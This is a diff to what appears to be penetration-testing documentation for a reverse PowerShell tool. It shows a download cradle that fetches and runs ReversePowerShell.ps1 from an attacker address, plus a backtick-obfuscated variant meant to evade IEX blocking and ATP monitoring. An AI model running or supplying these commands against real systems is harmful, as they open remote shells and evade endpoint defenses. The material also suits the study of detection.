@@ -41,7 +41,7 @@ memory in order to run the cmdlets.
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")
 
 # To obfuscate the above command you can do something like the below command
-& (`G`C`M *ke-E*) '(& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T)."`D`O`W`N`L`O`A`D`S`T`R`I`N`G"('htt'+'p://'+'127.0.0.1/ReversePowerShell.ps1')
+& (`G`C`M *ke-E*) (& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T)."`D`O`W`N`L`O`A`D`S`T`R`I`N`G"('htt'+'p://'+'127.0.0.1/ReversePowerShell.ps1')
 ```
 
 IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a target machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
